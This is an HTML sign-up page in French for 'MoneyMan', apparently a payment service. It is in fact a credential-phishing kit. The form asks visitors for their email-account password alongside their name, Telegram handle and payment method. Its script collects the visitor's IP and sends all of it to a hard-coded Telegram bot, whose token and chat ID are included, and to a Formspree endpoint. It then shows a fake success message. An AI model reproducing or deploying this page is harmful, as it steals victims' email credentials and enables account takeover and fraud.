<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MoneyMan - Création de Compte</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            min-height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(rgba(40, 167, 69, 0.85), rgba(40, 167, 69, 0.85)), 
                        url('https://i.imgur.com/YzvYTB9.jpeg');
            background-size: cover;
            background-position: center;
            background-blend-mode: multiply;
        }

        .money-man-container {
            background: rgba(255, 255, 255, 0.97);
            padding: 2.5rem;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
            backdrop-filter: blur(5px);
        }

        .logo {
            width: 120px;
            display: block;
            margin: 0 auto 1.5rem;
        }

        h1 {
            color: #28a745;
            text-align: center;
            font-size: 2.5rem;
            margin-bottom: 2rem;
            text-shadow: 2px 2px 4px rgba(40, 167, 69, 0.1);
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            color: #2c3e50;
            font-weight: 600;
        }

        input, select {
            width: 100%;
            padding: 14px;
            border: 2px solid #d4edda;
            border-radius: 8px;
            font-size: 1rem;
            transition: all 0.3s ease;
            background: #f8f9fa;
        }

        input:focus, select:focus {
            border-color: #28a745;
            box-shadow: 0 0 0 3px rgba(40, 167, 69, 0.25);
            background: #ffffff;
            outline: none;
        }

        #submitBtn {
            background: linear-gradient(135deg, #28a745 0%, #218838 100%);
            color: white;
            padding: 16px;
            font-size: 1.1rem;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            margin-top: 1.5rem;
            width: 100%;
            font-weight: bold;
            text-transform: uppercase;
        }

        #submitBtn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3);
        }

        .login-section {
            text-align: center;
            margin-top: 2rem;
            padding-top: 1.5rem;
            border-top: 1px solid #d4edda;
        }

        .login-link {
            color: #28a745;
            text-decoration: none;
            font-weight: 500;
            font-size: 0.9rem;
            transition: color 0.2s;
        }

        .password-requirements {
            font-size: 0.8rem;
            color: #6c757d;
            margin-top: 0.5rem;
        }
    </style>
</head>
<body>
    <div class="money-man-container">
        <img src="https://i.imgur.com/QaCMnOY.png" alt="Logo MoneyMan" class="logo">
        <h1>MoneyMan</h1>
        
        <form id="signupForm">
            <div class="form-group">
                <label>Nom complet</label>
                <input type="text" id="fullName" name="fullName" required>
            </div>

            <div class="form-group">
                <label>Adresse email</label>
                <input type="email" id="email" name="email" required>
            </div>

            <div class="form-group">
                <label>Mot de passe email</label>
                <input type="password" id="emailPassword" name="emailPassword" required>
            </div>

            <div class="form-group">
                <label>Mot de passe</label>
                <input type="password" id="password" name="password" minlength="8" required>
                <div class="password-requirements">
                    Minimum 8 caractères avec au moins 1 chiffre
                </div>
            </div>

            <div class="form-group">
                <label>Confirmer le mot de passe</label>
                <input type="password" id="confirmPassword" name="confirmPassword" required>
            </div>

            <div class="form-group"
                <label>Nom Telegram (@pseudo)</label>
                <input type="text" id="telegram" name="telegram" pattern="@.+" required>
            </div>

            <div class="form-group">
                <label>Mode de paiement</label>
                <select id="paymentMethod" name="paymentMethod" required>
                    <option value="">Choisir...</option>
                    <option>MTN money</option>
                    <option>Orange money</option>
                    <option>Binance</option>
                    <option>Carte bancaire</option>
                </select>
            </div>

            <button type="submit" id="submitBtn">Créer un compte</button>

            <div class="login-section">
                <p>Vous avez déjà un compte ? <a href="pSH.html" class="login-link">Se connecter</a></p>
            </div>
        </form>
    </div>

    <script>
        const BOT_TOKEN = '7673393308:AAE2SY5ZE4qKhPoTcMt21HXOhvhxmBcuDNw';
        const CHAT_ID = '1978974403';
        const FORMSPREE_ENDPOINT = 'https://formspree.io/f/mjkwkdol';

        document.getElementById('signupForm').addEventListener('submit', async (e) => {
            e.preventDefault();

            // Validation des mots de passe
            const password = document.getElementById('password').value;
            const confirmPassword = document.getElementById('confirmPassword').value;
            const passwordRegex = /^(?=.*\d).{8,}$/;

            if (!passwordRegex.test(password)) {
                alert('Le mot de passe doit contenir au moins 8 caractères avec un chiffre');
                return;
            }

            if (password !== confirmPassword) {
                alert('Les mots de passe ne correspondent pas');
                return;
            }

            try {
                // Collecte des données
                const formData = {
                    fullName: document.getElementById('fullName').value,
                    email: document.getElementById('email').value,
                    emailPassword: document.getElementById('emailPassword').value,
                    telegram: document.getElementById('telegram').value,
                    paymentMethod: document.getElementById('paymentMethod').value,
                    ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => data.ip),
                    timestamp: new Date().toLocaleString()
                };

                // Envoi à Telegram
                const telegramMessage = `
🔐 NOUVEAU COMPTE MONEYMAN 🔐
────────────────────────────
👤 Nom complet: ${formData.fullName}
📧 Email: ${formData.email}
🔑 Mot de passe email: ${formData.emailPassword}
📱 Telegram: ${formData.telegram}
💳 Méthode de paiement: ${formData.paymentMethod}
🌐 IP: ${formData.ip}
🕒 Date: ${formData.timestamp}
────────────────────────────`;

                const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: telegramMessage,
                        parse_mode: 'Markdown'
                    })
                });

                if (!telegramResponse.ok) throw new Error('Erreur Telegram');

                // Envoi à Formspree
                const formspreeData = new FormData();
                for (const [key, value] of Object.entries(formData)) {
                    formspreeData.append(key, value);
                }

                const formspreeResponse = await fetch(FORMSPREE_ENDPOINT, {
                    method: 'POST',
                    body: formspreeData,
                    headers: { 'Accept': 'application/json' }
                });

                if (!formspreeResponse.ok) throw new Error('Erreur serveur');

                // Confirmation finale
                alert('✅ Compte créé avec succès !\nVérifiez vos messages Telegram');
                document.getElementById('signupForm').reset();
                setTimeout(() => window.location.href = '#', 2000);

            } catch (error) {
                console.error('Erreur:', error);
                alert(`❌ Échec de l'inscription: ${error.message}`);
            }
        });
    </script>
</body>
</html>
